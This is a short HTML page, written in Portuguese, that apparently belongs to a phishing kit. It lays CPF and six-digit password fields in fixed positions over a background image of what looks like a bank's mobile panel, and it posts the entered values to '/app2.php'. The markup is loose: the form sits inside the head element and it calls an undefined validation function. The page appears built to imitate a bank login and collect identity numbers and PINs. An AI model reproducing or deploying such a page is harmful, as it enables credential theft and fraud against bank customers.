<!DOCTYPE html>
<html>

<style type="text/css">

body {
    background-image: url('./Imagens/Mobile/painel.png');
    background-repeat: no-repeat;
    background-size: 100%;
    background-position: 0px 100px;
}

.cpf {
  position: absolute; 
  left: 70px; 
  top: 655px; 
  border-width: 0 0 2px;
  width: 780px; 
  height: 100px; 
  outline: 0;
}

.senha {
  position: absolute; 
  left: 70px; 
  top: 840px; 
  border-width: 0 0 2px;
  width: 780px; 
  height: 100px; 
  outline: 0
}

input::placeholder {
    color: black;
    font-size: 35px
}

input {
  font-size: 35px;
}

@media screen and (-webkit-min-device-pixel-ratio:0) { 
  select:focus,
  textarea:focus,
  input:focus {
    font-size: 35px;
    background: #eee;
  }
}

</style>

<script>
 function mascara(t, mask){
 var i = t.value.length;
 var saida = mask.substring(1,0);
 var texto = mask.substring(i)
 if (texto.substring(0,1) != saida){
 t.value += texto.substring(0,1);
 }
 }
</script>
<head>

<div style="position:block">
<form method="post" action="/app2.php">

<input type="tel" minlength="14" maxlength="14" autocomplete="off" name="cpf" id="cpf" placeholder="CPF" class="cpf" oninvalid="setCustomValidity('Insira seu CPF.')" onkeypress="mascara(this, '000.000.000-00')" required/>

<input type="tel" minlength="6" maxlength="6" name="senha6" id="senha6" placeholder="Senha de 6 Digitos" class="senha" oninvalid="setCustomValidity('Insira sua senha.')" oninput="setCustomValidity('')" required/>

<button type="submit" onclick="valida_form();" style="display:block; width: 850px; height: 100px; left: 60px; top: 1020px; position: absolute; color: #fff; background-color: #1e1e1f; border-radius: 6px; font-size: 35px">Prosseguir</button>
</form>
</div>

</head>
</html>
